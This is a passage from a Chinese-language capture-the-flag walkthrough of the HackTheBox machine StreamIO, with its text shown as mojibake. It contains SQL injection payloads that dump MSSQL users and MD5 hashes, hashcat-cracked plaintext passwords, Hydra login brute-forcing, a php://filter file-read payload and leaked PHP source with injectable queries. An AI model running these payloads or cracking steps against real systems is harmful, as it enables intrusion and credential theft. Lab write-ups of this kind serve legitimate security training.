=&gt; https://watch.streamio.htb/static/css/</span><br><span class="line">403      GET       29l       92w     1233c https://watch.streamio.htb/static/</span><br><span class="line">301      GET        2l       10w      160c https://watch.streamio.htb/static/js =&gt; https://watch.streamio.htb/static/js/</span><br><span class="line">301      GET        2l       10w      157c https://watch.streamio.htb/static =&gt; https://watch.streamio.htb/static/</span><br><span class="line">403      GET       29l       92w     1233c https://watch.streamio.htb/static/css/</span><br><span class="line">200      GET       78l      245w     2829c https://watch.streamio.htb/index.php</span><br><span class="line">404      GET       40l      156w     1888c https://watch.streamio.htb/con</span><br><span class="line">404      GET       40l      156w     1895c https://watch.streamio.htb/static/con</span><br><span class="line">404      GET       40l      156w     1899c https://watch.streamio.htb/static/css/con</span><br><span class="line">404      GET       40l      156w     1898c https://watch.streamio.htb/static/js/con</span><br><span class="line">200      GET       20l       47w      677c https://watch.streamio.htb/blocked.php</span><br><span class="line">404      GET       40l      156w     1888c https://watch.streamio.htb/aux</span><br><span class="line">404      GET       40l      156w     1895c https://watch.streamio.htb/static/aux</span><br><span class="line">404      GET       40l      156w     1899c https://watch.streamio.htb/static/css/aux</span><br><span class="line">404      GET       40l      156w     1898c https://watch.streamio.htb/static/js/aux</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/css/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/css/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/js/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://watch.streamio.htb/static/js/error%1F_log.php</span><br><span class="line">404      GET       40l      156w     1888c https://watch.streamio.htb/prn</span><br><span class="line">404      GET       40l      156w     1895c https://watch.streamio.htb/static/prn</span><br><span class="line">404      GET       40l      156w     1899c https://watch.streamio.htb/static/css/prn</span><br><span class="line">404      GET       40l      156w     1898c https://watch.streamio.htb/static/js/prn</span><br><span class="line">[<span class="comment">####################] - 5m    106359/106359  0s      found:34      errors:1      </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/ </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/static/ </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/static/css/ </span></span><br><span class="line">[<span class="comment">####################] - 5m     26584/26584   84/s    https://watch.streamio.htb/static/js/</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥æ‰¾åˆ°ä¸€ä¸ª<a target="_blank" rel="noopener" href="https://watch.streamio.htb/search.php%E5%92%8Chttps://watch.streamio.htb/blocked.php%EF%BC%8C%E8%AE%BF%E9%97%AE/search.php%E4%B9%8B%E5%90%8E%E6%98%BE%E7%A4%BA%E7%9A%84%E6%98%AF%E4%B8%80%E4%B8%AA%E6%90%9C%E7%B4%A2%E7%95%8C%E9%9D%A2%EF%BC%8C%E4%B8%8D%E7%94%A8%E5%A4%9A%E8%AF%B4%EF%BC%8C%E5%A4%A7%E6%A6%82%E7%8E%87%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%9A">https://watch.streamio.htb/search.phpå’Œhttps://watch.streamio.htb/blocked.phpï¼Œè®¿é—®/search.phpä¹‹åæ˜¾ç¤ºçš„æ˜¯ä¸€ä¸ªæœç´¢ç•Œé¢ï¼Œä¸ç”¨å¤šè¯´ï¼Œå¤§æ¦‚ç‡å­˜åœ¨SQLæ³¨å…¥çš„æ¼æ´ï¼š</a></p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f16c458853aef53db73.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f16c458853aef53db73.jpg"></a></p>
<p>è®¿é—®&#x2F;blocked.phpï¼Œç•Œé¢å¦‚ä¸‹ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f22c458853aef53f10d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f22c458853aef53f10d.jpg"></a></p>
<p>æç¤ºçš„æœ‰å¯ç–‘è¡Œä¸ºï¼Œä¼šè¢«block 5åˆ†é’Ÿã€‚é¦–å…ˆå¯¹&#x2F;search.phpè¿›è¡Œæ‰‹å·¥æ³¨å…¥ï¼Œä¼ å…¥<code>1&#39;  and 1=1-- -</code>å’Œ<code>1&#39;  and 1=2-- -</code>ç»“æœä¸åŒï¼Œä¼ å…¥<code>1&#39;  and 1=1-- -</code>å’Œ<code>1&#39;  and 2=2-- -</code>ç»“æœç›¸åŒã€‚å¾ˆæ˜æ˜¾ï¼Œå­˜åœ¨ç›²æ³¨ã€‚ä¹‹åä¼ å…¥<code>1&#39; and (select count(*) from sysobjects)&gt;0-- -</code>ä¹‹åï¼Œé¡µé¢å›æ˜¾æ­£å¸¸ï¼Œåˆ¤æ–­æ•°æ®åº“ä¸ºMSSQLã€‚èµ·åˆæˆ‘å‘ç°xp_cmdshellæ˜¯å¼€å¯çŠ¶æ€ï¼Œæƒ³ç›´æ¥åˆ©ç”¨å®ƒæ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯åˆå‘ç°æˆ‘ä»¬çš„æƒé™å¹¶ä¸æ˜¯sysadminï¼Œæ‰€ä»¥æ²¡æ³•åˆ©ç”¨ï¼Œé‚æ”¾å¼ƒã€‚</p>
<p>å› ä¸ºç¦ç”¨äº†orderï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨<code>union select</code>æ¥åˆ¤æ–­åˆ—æ•°ï¼Œé€šè¿‡åœ¨<code>union select</code>åä¸æ–­æ·»åŠ å­—æ®µæ•°é‡ï¼Œå¾—åˆ°åˆ—æ•°ä¸º6ï¼Œå›æ˜¾ç‚¹ä¸º2å’Œ3ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f3bc458853aef542183.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f3bc458853aef542183.jpg"></a></p>
<p>æ¥ç€å°è¯•å¾—åˆ°æ•°æ®ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#è·å–ç‰ˆæœ¬</span><br><span class="line">000&#x27; union select 1,(select @@version),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) </span><br><span class="line">	Sep 24 2019 13:48:23 </span><br><span class="line">	Copyright (C) 2019 Microsoft Corporation</span><br><span class="line">	Express Edition (64-bit) on Windows Server 2019 Standard 10.0 </span><br><span class="line"></span><br><span class="line">#è·å–å½“å‰æ•°æ®åº“å</span><br><span class="line">000&#x27; union select 1,(select db_name()),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">STREAMIO</span><br><span class="line"></span><br><span class="line">#è·å–æ‰€æœ‰æ•°æ®åº“å</span><br><span class="line">000&#x27; union select 1,(select name from master..sysdatabases for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">&lt;row&gt;&lt;name&gt;master&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;tempdb&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;model&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;msdb&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;STREAMIO&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;streamio_backup&lt;/name&gt;&lt;/row&gt;</span><br><span class="line"></span><br><span class="line">#è·å–è¡¨å</span><br><span class="line">000&#x27; union select 1,(select name from STREAMIO..sysobjects where xtype=&#x27;u&#x27; for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">&lt;row&gt;&lt;name&gt;movies&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;users&lt;/name&gt;&lt;/row&gt;</span><br><span class="line"></span><br><span class="line">#è·å–usersè¡¨ä¸­çš„åˆ—å</span><br><span class="line">000&#x27; union select 1,(select name from STREAMIO..syscolumns where id=(select max(id) from STREAMIO..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;) for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">&lt;row&gt;&lt;name&gt;id&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;is_staff&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;password&lt;/name&gt;&lt;/row&gt;&lt;row&gt;&lt;name&gt;username&lt;/name&gt;&lt;/row&gt;</span><br><span class="line"></span><br><span class="line">#è·å–usernameå’Œpassword</span><br><span class="line">000&#x27; union select 1,(select username,password from STREAMIO..users for xml path),3,4,5,6-- -</span><br><span class="line"></span><br><span class="line">James c660060492d9edcaa8332d89c99c9239 Theodore 925e5408ecb67aea449373d668b7359e Samantha 083ffae904143c4796e464dac33c1f7d Lauren 08344b85b329d7efd611b7a7743e8a09 William d62be0dc82071bccc1322d64ec5b6c51 Sabrina f87d3c0d6c8fd686aacc6627f1f493a5 Robert f03b910e2bd0313a23fdd7575f34a694 Thane 3577c47eb1e12c8ba021611e1280753c Carmon 35394484d89fcfdb3c5e447fe749d213 Barry 54c88b2dbd7b1a84012fabc1a4c73415 Oliver fd78db29173a5cf701bd69027cb9bf6b Michelle b83439b16f844bd6ffe35c02fe21b3c0 Gloria 0cfaaaafb559f081df2befbe66686de0 Victoria b22abb47a02b52d5dfa27fb0b534f693 Alexendra 1c2b3d8270321140e5153f6637d3ee53 Baxter 22ee218331afd081b0dcd8115284bae3 Clara ef8f3d30a856cf166fb8215aca93e9ff Barbra 3961548825e3e21df5646cafe11c6c76 Lenord ee0b8a0937abd60c2882eacb2f8dc49f Austin 0049ac57646627b8d7aeaccf8b6a936f Garfield 8097cedd612cc37c29db152b6e9edbd3 Juliette 6dcd87740abb64edfa36d170f0d5450d Victor bf55e15b119860a6e6b5a164377da719 Lucifer 7df45a9e3de3863807c026ba48e55fb3 Bruno 2a4e2cf22dd8fcb45adcb91be1e22ae8 Diablo ec33265e5fc8c2f1b0c137bb7b3632b5 Robin dc332fb5576e9631c9dae83f194f8e70 Stan 384463526d288edcc95fc3701e523bc7 yoshihide b779ba15cedfd22a023c4d8bcf5f2332 admin 665a50ac9eaa781e4f7f04199db97a11</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°äº†ä¸€æ‰¹å¯†ç ï¼Œä½¿ç”¨hash-identifieræ£€éªŒä¹‹åï¼Œå‘ç°å¯†ç æ˜¯ä½¿ç”¨md5ç®—æ³•ç”Ÿæˆã€‚</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f47c458853aef5434e6.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f47c458853aef5434e6.jpg"></a></p>
<p>æ¥ä¸‹æ¥å°è¯•å¯¹è¿™æ‰¹å¯†ç è¿›è¡Œè§£å¯†ï¼Œä½†æ˜¯è§£å¯†ä¹‹å‰æˆ‘ä»¬éœ€è¦å¯¹æˆ‘ä»¬çš„æ•°æ®è¿›è¡Œä¸€äº›å¤„ç†ã€‚æ¯”å¦‚å°†usernameéƒ½å‚¨å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œç„¶åpasswordéƒ½å‚¨å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œä»¥åŠæŒ‰ç…§<code>username:password</code>çš„æ ¼å¼å†ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ã€‚ä¸ºæ­¤ï¼Œæˆ‘å†™äº†ä¸ªå°è„šæœ¬æ¥å¸®æˆ‘å®Œæˆè¿™ä»¶äº‹æƒ…ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;James c660060492d9edcaa8332d89c99c9239 Theodore 925e5408ecb67aea449373d668b7359e Samantha 083ffae904143c4796e464dac33c1f7d Lauren 08344b85b329d7efd611b7a7743e8a09 William d62be0dc82071bccc1322d64ec5b6c51 Sabrina f87d3c0d6c8fd686aacc6627f1f493a5 Robert f03b910e2bd0313a23fdd7575f34a694 Thane 3577c47eb1e12c8ba021611e1280753c Carmon 35394484d89fcfdb3c5e447fe749d213 Barry 54c88b2dbd7b1a84012fabc1a4c73415 Oliver fd78db29173a5cf701bd69027cb9bf6b Michelle b83439b16f844bd6ffe35c02fe21b3c0 Gloria 0cfaaaafb559f081df2befbe66686de0 Victoria b22abb47a02b52d5dfa27fb0b534f693 Alexendra 1c2b3d8270321140e5153f6637d3ee53 Baxter 22ee218331afd081b0dcd8115284bae3 Clara ef8f3d30a856cf166fb8215aca93e9ff Barbra 3961548825e3e21df5646cafe11c6c76 Lenord ee0b8a0937abd60c2882eacb2f8dc49f Austin 0049ac57646627b8d7aeaccf8b6a936f Garfield 8097cedd612cc37c29db152b6e9edbd3 Juliette 6dcd87740abb64edfa36d170f0d5450d Victor bf55e15b119860a6e6b5a164377da719 Lucifer 7df45a9e3de3863807c026ba48e55fb3 Bruno 2a4e2cf22dd8fcb45adcb91be1e22ae8 Diablo ec33265e5fc8c2f1b0c137bb7b3632b5 Robin dc332fb5576e9631c9dae83f194f8e70 Stan 384463526d288edcc95fc3701e523bc7 yoshihide b779ba15cedfd22a023c4d8bcf5f2332 admin 665a50ac9eaa781e4f7f04199db97a11&quot;</span></span><br><span class="line">a = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">f_user = <span class="built_in">open</span>(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">f_pass = <span class="built_in">open</span>(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">f_uap = <span class="built_in">open</span>(<span class="string">&quot;userpass&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        f_user.write(a[i] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f_uap.write(a[i] + <span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f_pass.write(a[i] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f_uap.write(a[i] + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f_uap.close()</span><br><span class="line">f_user.close()</span><br><span class="line">f_pass.close()</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ä½¿ç”¨hashcatå¯¹å¯†ç è¿›è¡Œç ´è§£ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â””â”€<span class="comment"># hashcat userpass /usr/share/wordlists/rockyou.txt --username -m 0 --show</span></span><br><span class="line">Lauren:08344b85b329d7efd611b7a7743e8a09:<span class="comment">##123a8j8w5123##</span></span><br><span class="line">Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$</span><br><span class="line">Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical</span><br><span class="line">Barry:54c88b2dbd7b1a84012fabc1a4c73415:<span class="variable">$hadoW</span></span><br><span class="line">Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123</span><br><span class="line">Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!</span><br><span class="line">Clara:ef8f3d30a856cf166fb8215aca93e9ff:%<span class="variable">$clara</span></span><br><span class="line">Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i</span><br><span class="line">Juliette:6dcd87740abb64edfa36d170f0d5450d:<span class="variable">$3xybitch</span></span><br><span class="line">Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$</span><br><span class="line">yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..</span><br><span class="line">admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd</span><br></pre></td></tr></table></figure>

<p>ç»§ç»­å¯¹è¯¥ç»“æœè¿›è¡Œå¤„ç†ï¼Œå°†usernameéƒ½å‚¨å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œå°†å·²ç ´è§£çš„passwordéƒ½å‚¨å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œä»¥åŠæŒ‰ç…§<code>username:password</code>çš„æ ¼å¼å†ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hashcat userpass /usr/share/wordlists/rockyou.txt --username -m 0 --show &gt; tmp</span><br><span class="line"><span class="built_in">cat</span> tmp |awk -F : <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; cracked_username</span><br><span class="line"><span class="built_in">cat</span> tmp |awk -F : <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> &gt; cracked_password</span><br><span class="line"><span class="built_in">cat</span> tmp |awk -F : -v OFS=<span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $1,$3&#125;&#x27;</span> &gt; cracked_userpass</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæˆ‘ä»¬æ‹¿åˆ°çš„æ˜¯STREAMIOçš„usersæ•°æ®åº“ï¼Œå¯ä»¥çŒœæµ‹å‡ºè¿™åº”è¯¥å¯ä»¥ç”¨äº<code>https://streamio.htb</code>çš„ç™»å½•ã€‚ä½†æ˜¯éšä¾¿ç”¨äº†ä¸€æ‰¹è´¦æˆ·å¯†ç æ²¡ç™»è¿›å»ï¼Œé‚£è¯•è¯•çˆ†ç ´ä¸€ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â””â”€<span class="comment"># hydra -C cracked_userpass streamio.htb https-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:Failed&quot;             </span></span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-10 11:35:12</span><br><span class="line">[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries, ~1 try per task</span><br><span class="line">[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&amp;password=^PASS^:Failed</span><br><span class="line">[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-10 11:35:14</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°äº†ä¸€å¯¹å¯ç”¨çš„è´¦å·å¯†ç ï¼š<code>yoshihide:66boysandgirls..</code>ã€‚æ¥ä¸‹æ¥ç™»å½•ä¹‹åï¼Œè®¿é—®ä¹‹å‰çˆ†ç ´å‡ºçš„&#x2F;adminç›®å½•ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f55c458853aef54499a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f55c458853aef54499a.jpg"></a></p>
<p>æ˜¯ä¸€ä¸ªç®¡ç†å‘˜é¢æ¿ã€‚ç»è¿‡è§‚å¯Ÿï¼Œå‘ç°GETä¼ å…¥çš„å‚æ•°ä¸åŒï¼Œä¼šè½¬åˆ°ä¸åŒçš„é¡µé¢ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f5fc458853aef545dce.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f5fc458853aef545dce.jpg"></a></p>
<p>ä½†æ˜¯å°è¯•å°†è¿™äº›å‚æ•°çš„å€¼æ”¹æˆä¹‹å‰å¾—åˆ°çš„master.phpä¹‹åï¼Œå¹¶æœªå¾—åˆ°ä»»ä½•ç»“æœã€‚å› æ­¤å¯ä»¥å°è¯•å‚æ•°çˆ†ç ´ï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨æˆ‘ä»¬éšè—ç•Œé¢ï¼Œä»¥ä¸‹æ˜¯çˆ†ç ´çš„ç»“æœï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wfuzz -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -c -u https://streamio.htb/admin/?FUZZ= -H &quot;Cookie: PHPSESSID=puqalerh2km91i9t6p5aa0qggq&quot;  --hw 131</span></span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: https://streamio.htb/admin/?FUZZ=</span></span><br><span class="line"><span class="string">Total requests: 6453</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                                                                                                   </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000001575:   200        49 L     137 W      1712 Ch     &quot;debug&quot;                                                                                                                   </span></span><br><span class="line"><span class="string">000003530:   200        10790    25878 W    320235 Ch   &quot;movie&quot;                                                                                                                   </span></span><br><span class="line"><span class="string">                        L                                                                                                                                                         </span></span><br><span class="line"><span class="string">000005450:   200        398 L    916 W      12484 Ch    &quot;staff&quot;                                                                                                                   </span></span><br><span class="line"><span class="string">000006133:   200        62 L     160 W      2073 Ch     &quot;user&quot;                                                                                                                    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Total time: 76.33917</span></span><br><span class="line"><span class="string">Processed Requests: 6453</span></span><br><span class="line"><span class="string">Filtered Requests: 6449</span></span><br><span class="line"><span class="string">Requests/sec.: 84.53064</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªdebugå‚æ•°ï¼Œæˆ‘ä»¬è®¿é—®ä¹‹åï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f6bc458853aef547ee9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f6bc458853aef547ee9.jpg"></a></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæç¤ºæˆ‘ä»¬æ­¤é€‰é¡¹ä»…ä¾›å¼€å‘è€…ä½¿ç”¨ã€‚æˆ‘ä»¬å°†debugçš„å€¼è®¾ä¸ºmaster.phpä¹‹åï¼Œå‘ç°åˆå‡ºç°äº†movieã€staffä»¥åŠuserçš„ç®¡ç†ç•Œé¢çš„è¯¦æƒ…ã€‚å°è¯•phpä¼ªåè®®è¯»ä¸€ä¸‹ä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://streamio.htb/admin/?debug=php://filter/read=convert.base64-encode/resource=master.php</span><br></pre></td></tr></table></figure>

<p>å°†å¾—åˆ°çš„ç»“æœbase64è§£ç åï¼Œå¾—åˆ°master.phpçš„æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;Movie managment&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;included&#x27;</span>))</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;Only accessable through includes&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;movie_id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;delete from movies where id = &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;movie_id&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">sqlsrv_query</span>(<span class="variable">$handle</span>, <span class="variable">$query</span>, <span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">&quot;Scrollable&quot;</span>=&gt;<span class="string">&quot;buffered&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span 